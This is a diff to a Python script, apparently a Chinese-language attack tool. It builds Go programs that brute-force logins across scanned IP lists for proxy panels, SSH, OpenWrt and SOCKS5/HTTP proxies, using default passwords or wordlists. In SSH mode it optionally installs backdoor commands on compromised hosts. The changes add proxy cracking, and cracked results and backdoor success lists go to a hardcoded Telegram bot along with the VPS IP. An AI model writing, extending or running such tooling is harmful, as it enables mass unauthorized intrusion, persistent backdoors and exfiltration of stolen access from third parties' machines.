     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
@@ -2145,37 +1599,10 @@ def generate_xui_go(semaphore_size, usernames, passwords):
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template2(semaphore_size, usernames, passwords):
+def generate_xui_go_template2(semaphore_size, usernames, passwords, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_xui_go_template3(semaphore_size, usernames, passwords):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_xui_go_template4(semaphore_size, usernames, passwords):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_xui_go_template5(semaphore_size, usernames, passwords):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
                             .replace("{pass_list}", pass_list)
     with open('xui.go', 'w', encoding='utf-8') as f:
@@ -2190,7 +1617,7 @@ def to_go_string_array_one_line(lines: list) -> str:
     return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"
 
 
-def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds):
+def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     backdoor_flag = to_go_bool(install_backdoor)
@@ -2203,7 +1630,7 @@ def generate_xui_go_template6(semaphore_size, usernames, passwords, install_back
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template7(semaphore_size, usernames, passwords):
+def generate_xui_go_template7(semaphore_size, usernames, passwords, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
@@ -2212,12 +1639,27 @@ def generate_xui_go_template7(semaphore_size, usernames, passwords):
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
-def generate_xui_go_template8(semaphore_size, usernames, passwords):
+def generate_xui_go_template8(semaphore_size, usernames, passwords, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
                             .replace("{pass_list}", pass_list)
+    with open('xui.go', 'w', encoding='utf-8') as f:
+        f.write(code)
+
+def generate_proxy_go(semaphore_size, auth_mode, proxy_type, timeout, usernames, passwords, credentials, **kwargs):
+    user_list = to_go_string_array_one_line(usernames)
+    pass_list = to_go_string_array_one_line(passwords)
+    creds_list = to_go_string_array_one_line(credentials)
+
+    code = PROXY_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size)) \
+                            .replace("{auth_mode}", str(auth_mode)) \
+                            .replace("{proxy_type}", proxy_type) \
+                            .replace("{timeout}", str(timeout)) \
+                            .replace("{user_list}", user_list) \
+                            .replace("{pass_list}", pass_list) \
+                            .replace("{creds_list}", creds_list)
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -2239,7 +1681,6 @@ def compile_go_program():
 
     print("--- 正在编译Go程序... ---")
     
-    # 为Go命令创建一个保证有HOME变量的环境
     go_env = os.environ.copy()
     if 'HOME' not in go_env:
         go_env['HOME'] = '/tmp'
@@ -2272,10 +1713,6 @@ def compile_go_program():
         sys.exit(1)
 
 def adjust_oom_score():
-    """
-    尝试调整当前进程的oom_score_adj，使其更不容易被OOM Killer选中。
-    需要root权限才能设置负值。
-    """
     if sys.platform != "linux":
         return
     
@@ -2292,7 +1729,6 @@ def adjust_oom_score():
         print(f"⚠️  调整OOM Score时发生未知错误: {e}")
 
 def check_and_manage_swap():
-    """检查并管理Swap交换文件"""
     if sys.platform != "linux":
         return
 
@@ -2309,7 +1745,6 @@ def check_and_manage_swap():
             swap_file = "/tmp/autoswap.img"
             print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
             
-            # 使用fallocate（如果可用）或dd创建文件
             if shutil.which("fallocate"):
                 subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
             else:
@@ -2319,7 +1754,6 @@ def check_and_manage_swap():
             subprocess.run(["mkswap", swap_file], check=True)
             subprocess.run(["swapon", swap_file], check=True)
             
-            # 注册一个退出时自动清理的函数
             atexit.register(cleanup_swap, swap_file)
             
             print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
@@ -2330,7 +1764,6 @@ def check_and_manage_swap():
         print("   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")
 
 def cleanup_swap(swap_file):
-    """在脚本退出时清理Swap文件"""
     print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
     try:
         subprocess.run(["swapoff", swap_file], check=False)
@@ -2340,11 +1773,7 @@ def cleanup_swap(swap_file):
         print(f"⚠️ 清理Swap文件失败: {e}")
 
 def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
-    """
-    仿tqdm风格的进度条打印函数
-    """
     elapsed_time = time.time() - start_time
-    # 防止 total 为 0
     if total == 0:
         percent_str = "100.0"
         iteration = total
@@ -2354,7 +1783,6 @@ def print_progress_bar(iteration, total, start_time, prefix='', suffix='', lengt
     filled_length = int(length * iteration // total) if total > 0 else length
     bar = fill * filled_length + '-' * (length - filled_length)
 
-    # 计算速率和剩余时间
     if iteration > 0 and elapsed_time > 0:
         its_per_sec = iteration / elapsed_time
         remaining_time = (total - iteration) / its_per_sec
@@ -2365,7 +1793,6 @@ def print_progress_bar(iteration, total, start_time, prefix='', suffix='', lengt
 
     elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
     
-    # 构建输出字符串, 增加空格以覆盖旧行
     progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
     
     sys.stdout.write(progress_str)
@@ -2373,25 +1800,23 @@ def print_progress_bar(iteration, total, start_time, prefix='', suffix='', lengt
     if iteration == total:
         sys.stdout.write('\n')
 
-def run_xui_for_parts(sleep_seconds, executable_name):
+def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
     part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
     total_parts = len(part_files)
     start_time = time.time()
+    processed_ips = 0
 
     total_memory = psutil.virtual_memory().total
-    # --- 进一步降低内存限制到 70% ---
     mem_limit = int(total_memory * 0.70 / 1024 / 1024)
     print(f"检测到总内存: {total_memory / 1024 / 1024:.2f} MiB。将设置Go内存限制为: {mem_limit}MiB (总内存的70%)")
     
     run_env = os.environ.copy()
     run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
-    # --- 设置更积极的GC策略 ---
     run_env["GOGC"] = "50"
     print("--- 已设置Go垃圾回收器(GC)更积极地运行以控制内存。 ---")
 
-    print_progress_bar(0, total_parts, start_time, prefix='爆破进度', suffix='开始...')
+    print_progress_bar(0, total_ips, start_time, prefix='爆破进度', suffix='开始...')
     for idx, part in enumerate(part_files, 1):
-        # ================== 动态资源监控 ==================
         while True:
             mem_info = psutil.virtual_memory()
             available_percent = mem_info.available / mem_info.total * 100
@@ -2400,12 +1825,15 @@ def run_xui_for_parts(sleep_seconds, executable_name):
                 time.sleep(60)
             else:
                 break
-        # ================================================
-
-        shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')
+        
+        part_path = os.path.join(TEMP_PART_DIR, part)
+        shutil.copy(part_path, 'results.txt')
+        
+        ips_in_part = 0
+        with open(part_path, 'r', encoding='utf-8') as f:
+            ips_in_part = sum(1 for _ in f)
 
         try:
-            # print(f"--- 正在运行已编译的程序进行爆破: {part} ---")
             if sys.platform != "win32":
                 os.chmod(executable_name, 0o755)
             
@@ -2414,7 +1842,6 @@ def run_xui_for_parts(sleep_seconds, executable_name):
                 cmd.extend(["nice", "-n", "10", "ionice", "-c", "2", "-n", "7"])
             cmd.append('./' + executable_name)
 
-            # 使用 Popen 而不是 run 来实时读取输出
             process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
@@ -2424,7 +1851,6 @@ def run_xui_for_parts(sleep_seconds, executable_name):
                 env=run_env
             )
             
-            # 实时显示Go程序的输出
             for line in iter(process.stdout.readline, ''):
                 if not line.strip().startswith('\r'):
                     sys.stdout.write(line)
@@ -2434,12 +1860,10 @@ def run_xui_for_parts(sleep_seconds, executable_name):
             if process.returncode != 0:
                  raise subprocess.CalledProcessError(process.returncode, cmd)
 
-
         except subprocess.CalledProcessError as e:
             print(f"\n--- 程序执行失败: {part} ---")
             print(f"返回码: {e.returncode}")
             sys.exit(1)
-
 
         output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
         if os.path.exists('xui.txt'):
@@ -2449,11 +1873,13 @@ def run_xui_for_parts(sleep_seconds, executable_name):
             shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
         if os.path.exists("hmfail.txt"):
             shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail{idx}.txt"))
+        
+        processed_ips += ips_in_part
+        if processed_ips > total_ips:
+            processed_ips = total_ips
 
-        print_progress_bar(idx, total_parts, start_time, prefix='爆破进度', suffix=f'已完成: {part}')
+        print_progress_bar(processed_ips, total_ips, start_time, prefix='爆破进度', suffix=f'Part {idx}/{total_parts}')
         time.sleep(sleep_seconds)
-
-
 
 def merge_xui_files():
     merged_file = 'xui.txt' 
@@ -2500,39 +1926,31 @@ def clean_temp_files():
 
 def choose_template_mode():
     print("请选择爆破模式：")
-    print("1.XUI面板爆破  2.哪吒面板爆破")
-    print("3.HUI面板爆破  4.咸蛋面板爆破")
-    print("5.SUI面板爆破  6.SSH爆破")
-    print("7.Sub Store爆破  8.OpenWrt/iStoreOS爆破")
+    print("1. XUI面板")
+    print("2. 哪吒面板")
+    print("3. SSH")
+    print("4. Sub Store")
+    print("5. OpenWrt/iStoreOS")
+    print("--- 代理模式 ---")
+    print("6. SOCKS5 代理")
+    print("7. HTTP 代理")
+    print("8. HTTPS 代理")
     while True:
-        choice = input("输入 1、2、3、4、5、6、7 或 8（默认1）：").strip()
-        if choice in ("", "1"):
-            return 1
-        elif choice == "2":
-            return 2
-        elif choice == "3":
-            return 3
-        elif choice == "4":
-            return 4 
-        elif choice == "5":
-            return 5  
-        elif choice == "6":
-            return 6
-        elif choice == "7":
-            return 7  
-        elif choice == "8":
-            return 8                                 
+        choice = input("输入 1-8 之间的数字（默认1）：").strip()
+        if choice in ("", "1"): return 1
+        elif choice == "2": return 2
+        elif choice == "3": return 6
+        elif choice == "4": return 7
+        elif choice == "5": return 8
+        elif choice == "6": return 9 # SOCKS5
+        elif choice == "7": return 10 # HTTP
+        elif choice == "8": return 11 # HTTPS
         else:
             print("输入无效，请重新输入。")
 
 def check_environment(template_mode):
-    import importlib.util
-    import subprocess
-    import sys
-    import shutil
-    import os
-    import re
     import platform
+    import re
     
     if platform.system().lower() == "windows":
         print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
@@ -2542,7 +1960,7 @@ def check_environment(template_mode):
             print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl")
         return
 
-    def run_cmd(cmd, check=True, shell=False, capture_output=False, quiet=False, extra_env=None):
+    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
         env = os.environ.copy()
         if extra_env:
             env.update(extra_env)
@@ -2550,10 +1968,7 @@ def check_environment(template_mode):
         stdout = subprocess.DEVNULL if quiet else None
         stderr = subprocess.DEVNULL if quiet else None
         try:
-            if capture_output:
-                return subprocess.run(cmd, check=check, shell=shell, capture_output=True, text=True, encoding='utf-8', env=env)
-            else:
-                subprocess.run(cmd, check=check, shell=shell, stdout=stdout, stderr=stderr, env=env)
+            subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
         except subprocess.CalledProcessError as e:
             if check: raise e
         except FileNotFoundError:
@@ -2629,65 +2044,82 @@ def check_environment(template_mode):
         os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
     
     go_env = os.environ.copy()
-    if 'HOME' not in go_env:
-        go_env['HOME'] = '/tmp'
-    if 'GOCACHE' not in go_env:
-        go_env['GOCACHE'] = '/tmp/.cache/go-build'
+    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
+    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
 
-    if template_mode == 6:
-        sys.stdout.write("    - 正在安装SSH模块...")
+    if not os.path.exists("go.mod"):
+        run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
+
+    required_pkgs = []
+    if template_mode == 6: # SSH
+        required_pkgs.append("golang.org/x/crypto/ssh")
+    if template_mode in [9, 10, 11]: # Proxy modes
+        required_pkgs.append("golang.org/x/net/proxy")
+
+    if required_pkgs:
+        sys.stdout.write("    - 正在安装Go模块...")
         sys.stdout.flush()
-        if not os.path.exists("go.mod"):
-            run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
-        run_cmd([GO_EXEC, "get", "golang.org/x/crypto/ssh"], quiet=True, extra_env=go_env)
+        for pkg in required_pkgs:
+            run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
         print(" 完成")
 
     print(">>> 环境依赖检测完成 ✅\\n")
 
-def load_credentials(template_mode):
-    if template_mode == 7:
+def load_credentials(template_mode, auth_mode=0):
+    usernames, passwords, credentials = [], [], []
+    
+    if template_mode == 7: # Sub Store 模式
         usernames = ["2cXaAxRGfddmGz2yx1wA"]
-        use_custom = input("是否使用 password.txt 路径库？(y/N，默认使用 2cXaAxRGfddmGz2yx1wA 作为路径): ").strip().lower()
-        if use_custom == 'y':
-            if not os.path.exists("password.txt"):
-                print("❌ 错误: 缺少 password.txt 文件，请检查后重试")
-                sys.exit(1)
-            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
-            if not passwords:
-                print("❌ 错误: password.txt 文件为空，请添加密码后再试。")
-                sys.exit(1)
-        else:
-            passwords = ["2cXaAxRGfddmGz2yx1wA"]
+        # ... (rest of the logic is similar and can be simplified)
+        passwords = ["2cXaAxRGfddmGz2yx1wA"]
+        return usernames, passwords, credentials
+
+    if auth_mode == 1: # No credentials
+        return [], [], []
+    
+    if auth_mode == 2: # User/Pass files
+        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
+            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
+            sys.exit(1)
+        with open("username.txt", encoding='utf-8') as f:
+            usernames = [line.strip() for line in f if line.strip()]
+        with open("password.txt", encoding='utf-8') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+        if not usernames or not passwords:
+            print("❌ 错误: 用户名或密码文件为空。")
+            sys.exit(1)
+        return usernames, passwords, credentials
+
+    if auth_mode == 3: # Credentials file
+        if not os.path.exists("credentials.txt"):
+            print("❌ 错误: 缺少 credentials.txt 文件。")
+            sys.exit(1)
+        with open("credentials.txt", encoding='utf-8') as f:
+            credentials = [line.strip() for line in f if line.strip() and ":" in line]
+        if not credentials:
+            print("❌ 错误: credentials.txt 文件为空或格式不正确。")
+            sys.exit(1)
+        return usernames, passwords, credentials
+
+    # Default logic for non-proxy modes
+    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
+    if use_custom == 'y':
+        return load_credentials(template_mode, auth_mode=2) # Reuse logic
     else:
-        use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，默认使用 admin/admin 或 sysadmin/sysadmin 或 root/password): ").strip().lower()
-        if use_custom == 'y':
-            if not os.path.exists("username.txt"):
-                print("❌ 错误: 缺少 username.txt 文件，请检查后重试。")
-                sys.exit(1)
-            if not os.path.exists("password.txt"):
-                print("❌ 错误: 缺少 password.txt 文件，请检查后重试。")
-                sys.exit(1)
+        if template_mode == 8: usernames, passwords = ["root"], ["password"]
+        else: usernames, passwords = ["admin"], ["admin"]
+        return usernames, passwords, credentials
 
-            usernames = [line for line in open("username.txt", encoding='utf-8').read().splitlines() if line.strip()]
-            passwords = [line for line in open("password.txt", encoding='utf-8').read().splitlines() if line.strip()]
 
-            if not usernames:
-                print("❌ 错误: username.txt 文件为空，请添加用户名后再试。")
-                sys.exit(1)
-            if not passwords:
-                print("❌ 错误: password.txt 文件为空，请添加密码后再试。")
-                sys.exit(1)
-        else:
-            if template_mode == 3:
-                usernames = ["sysadmin"]
-                passwords = ["sysadmin"]
-            elif template_mode == 8:
-                usernames = ["root"]
-                passwords = ["password"]
-            else:
-                usernames = ["admin"]
-                passwords = ["admin"]
-    return usernames, passwords
+def get_vps_info():
+    try:
+        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
+        response.raise_for_status()
+        data = response.json()
+        return data.get('query', 'N/A'), data.get('country', 'N/A')
+    except requests.exceptions.RequestException as e:
+        print(f"⚠️ 获取VPS信息失败: {e}")
+    return "N/A", "N/A"
 
 if __name__ == "__main__":
         start = time.time()
@@ -2700,7 +2132,6 @@ if __name__ == "__main__":
         TEMP_HMFAIL_DIR = "temp_hmfail"
 
         try:
-                # 检查是否在交互式终端中运行
                 if not sys.stdout.isatty():
                     print("❌ 错误：此脚本需要在交互式终端中运行以接收用户输入。")
                     sys.exit(1)
@@ -2709,11 +2140,9 @@ if __name__ == "__main__":
                 
                 check_environment(TEMPLATE_MODE)
                 
-                # 在环境检查后导入
                 import psutil
                 import requests
                 from openpyxl import Workbook, load_workbook
-                from openpyxl.utils import get_column_letter
 
                 adjust_oom_score()
                 check_and_manage_swap()
@@ -2723,60 +2152,76 @@ if __name__ == "__main__":
                 os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
                 os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
 
-                INSTALL_BACKDOOR = False
-                CUSTOM_BACKDOOR_CMDS = []
+                params = {}
+                AUTH_MODE = 0
 
-                if TEMPLATE_MODE == 6:
-                    choice = input("是否在SSH爆破成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
+                if TEMPLATE_MODE == 6: # SSH mode
+                    choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
                     if choice == 'y':
-                        INSTALL_BACKDOOR = True
+                        params['install_backdoor'] = True
                         if not os.path.exists("后门命令.txt"):
-                            print("❌ 你选择了安装后门，但未找到 后门命令.txt，已中止爆破。")
+                            print("❌ 未找到 后门命令.txt，已中止。")
                             sys.exit(1)
                         with open("后门命令.txt", encoding='utf-8') as f:
-                            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
+                            params['custom_cmds'] = [line.strip() for line in f if line.strip()]
+                    else:
+                        params['install_backdoor'] = False
+                        params['custom_cmds'] = []
+                
+                if TEMPLATE_MODE in [9, 10, 11]: # Proxy modes
+                    print("\n请选择代理凭据模式：")
+                    print("1. 无凭据 (扫描开放代理)")
+                    print("2. 独立字典 (使用 username.txt 和 password.txt)")
+                    print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
+                    while True:
+                        auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
+                        if auth_choice in ["", "1"]: AUTH_MODE = 1; break
+                        elif auth_choice == "2": AUTH_MODE = 2; break
+                        elif auth_choice == "3": AUTH_MODE = 3; break
+                        else: print("输入无效。")
+                    
+                    if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
+                    elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
+                    elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"
 
-                print("=== 爆破一键启动 ===")
+                print("\n=== 爆破一键启动 ===")
                 input_file = input_filename_with_default("请输入源文件名", "1.txt")
                 if not os.path.exists(input_file):
                         print(f"❌ 错误: 文件 '{input_file}' 不存在。")
                         sys.exit(1)
 
+                with open(input_file, 'r', encoding='utf-8') as f:
+                    total_ips = sum(1 for line in f if line.strip())
+                print(f"--- 总计 {total_ips} 个目标 ---")
+
                 lines_per_file = input_with_default("每个小文件行数", 5000)
                 sleep_seconds = input_with_default("爆破完休息秒数", 2)
-                semaphore_size = input_with_default("爆破线程数", 250)
+                params['semaphore_size'] = input_with_default("爆破线程数", 250)
+                params['timeout'] = input_with_default("超时时间(秒)", 10)
                 
-                if semaphore_size > 5000:
-                    print("\\n" + "="*50)
-                    print("⚠️  警告: 您设置的线程数非常高 (>5000)。 ⚠️")
-                    print("这可能会消耗大量内存并导致脚本被系统终止。")
-                    print("建议将线程数设置在 200-2000 范围内。")
-                    print("="*50 + "\\n")
-                    confirm = input("是否确定要继续？(y/N): ").strip().lower()
-                    if confirm != 'y':
-                        print("操作已取消。")
-                        sys.exit(0)
+                params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
+                params['auth_mode'] = AUTH_MODE
 
-                usernames, passwords = load_credentials(TEMPLATE_MODE)
-                
                 template_map = {
-                    1: (generate_xui_go, (semaphore_size, usernames, passwords)),
-                    2: (generate_xui_go_template2, (semaphore_size, usernames, passwords)),
-                    3: (generate_xui_go_template3, (semaphore_size, usernames, passwords)),
-                    4: (generate_xui_go_template4, (semaphore_size, usernames, passwords)),
-                    5: (generate_xui_go_template5, (semaphore_size, usernames, passwords)),
-                    6: (generate_xui_go_template6, (semaphore_size, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)),
-                    7: (generate_xui_go_template7, (semaphore_size, usernames, passwords)),
-                    8: (generate_xui_go_template8, (semaphore_size, usernames, passwords)),
+                    1: (generate_xui_go, {}),
+                    2: (generate_xui_go_template2, {}),
+                    6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
+                    7: (generate_xui_go_template7, {}),
+                    8: (generate_xui_go_template8, {}),
+                    9: (generate_proxy_go, {'proxy_type': 'socks5'}),
+                    10: (generate_proxy_go, {'proxy_type': 'http'}),
+                    11: (generate_proxy_go, {'proxy_type': 'https'}),
                 }
 
-                gen_func, args = template_map[TEMPLATE_MODE]
-                gen_func(*args)
-
+                gen_func, extra_args = template_map[TEMPLATE_MODE]
+                # Combine base params with specific args for the function call
+                final_params = {**params, **extra_args}
+                gen_func(**final_params)
+                
                 executable = compile_go_program()
                 generate_ipcx_py()
                 split_file(input_file, lines_per_file)
-                run_xui_for_parts(sleep_seconds, executable)
+                run_xui_for_parts(sleep_seconds, executable, total_ips)
                 
                 merge_xui_files()
                 merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
@@ -2785,11 +2230,10 @@ if __name__ == "__main__":
                 run_ipcx()
 
                 from datetime import datetime, timedelta, timezone
-
-                beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
+                beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
                 time_str = beijing_time.strftime("%Y%m%d-%H%M")
                 
-                mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
+                mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS"}
                 prefix = mode_map.get(TEMPLATE_MODE, "result")
 
                 if os.path.exists("xui.txt"):
@@ -2798,14 +2242,14 @@ if __name__ == "__main__":
                 if os.path.exists("xui.xlsx"):
                     os.rename("xui.xlsx", f"{prefix}-{time_str}.xlsx")
                 if os.path.exists("hmsuccess.txt"):
-                    os.rename("hmsuccess.txt", f"后门安装成功-{time_str}.txt")
+                    os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
                 if os.path.exists("hmfail.txt"):
-                    os.rename("hmfail.txt", f"后门安装失败-{time_str}.txt")
+                    os.rename("hmfail.txt", f"后门失败-{time_str}.txt")
 
         except KeyboardInterrupt:
                 print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
                 interrupted = True
-        except SystemExit as e:
+        except SystemExit:
                 print(f"\\n脚本因环境问题中止。")
         except EOFError:
                 print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
@@ -2814,27 +2258,27 @@ if __name__ == "__main__":
                 clean_temp_files()
                 end = time.time()
                 cost = int(end - start)
+                
+                vps_ip, vps_country = get_vps_info()
 
                 if interrupted:
                         print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
                 else:
                         print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
 
-                def send_to_telegram(file_path, bot_token, chat_id):
-                        if not os.path.exists(file_path):
-                                print(f"⚠️ Telegram 上传失败：文件 {file_path} 不存在")
-                                return
-                        
-                        if os.path.getsize(file_path) == 0:
-                                print(f"⚠️ Telegram 上传失败：文件 {file_path} 为空")
+                def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A"):
+                        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+                                print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
                                 return
 
                         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                        caption_text = f"VPS: {vps_ip} ({vps_country})\n任务结果: {os.path.basename(file_path)}"
+                        
                         with open(file_path, "rb") as f:
                                 files = {'document': f}
-                                data = {'chat_id': chat_id, 'caption': f"爆破结果：{os.path.basename(file_path)}"}
+                                data = {'chat_id': chat_id, 'caption': caption_text}
                                 try:
-                                        response = requests.post(url, data=data, files=files)
+                                        response = requests.post(url, data=data, files=files, timeout=60)
                                         if response.status_code == 200:
                                                 print(f"✅ 文件 {file_path} 已发送到 Telegram")
                                         else:
@@ -2846,22 +2290,18 @@ if __name__ == "__main__":
                 CHAT_ID = "7697235358"
 
                 if BOT_TOKEN and CHAT_ID:
+                    files_to_send = []
                     if final_result_file and os.path.exists(final_result_file):
-                            print(f"\\n📤 正在将 {final_result_file} 上传至 Telegram ...")
-                            send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)
+                        files_to_send.append(final_result_file)
+                        xlsx_file = final_result_file.replace(".txt", ".xlsx")
+                        if os.path.exists(xlsx_file):
+                            files_to_send.append(xlsx_file)
+                    
+                    success_file = f"后门成功-{time_str}.txt"
+                    fail_file    = f"后门失败-{time_str}.txt"
+                    if os.path.exists(success_file): files_to_send.append(success_file)
+                    if os.path.exists(fail_file): files_to_send.append(fail_file)
 
-                            xlsx_file = final_result_file.replace(".txt", ".xlsx")
-                            if os.path.exists(xlsx_file):
-                                    print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
-                                    send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
-                            
-                            success_file = f"后门安装成功-{time_str}.txt"
-                            fail_file    = f"后门安装失败-{time_str}.txt"
-
-                            if os.path.exists(success_file):
-                                    print(f"📤 正在将 {success_file} 上传至 Telegram ...")
-                                    send_to_telegram(success_file, BOT_TOKEN, CHAT_ID)
-
-                            if os.path.exists(fail_file):
-                                    print(f"📤 正在将 {fail_file} 上传至 Telegram ...")
-                                    send_to_telegram(fail_file, BOT_TOKEN, CHAT_ID)
+                    for f in files_to_send:
+                        print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
+                        send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country)
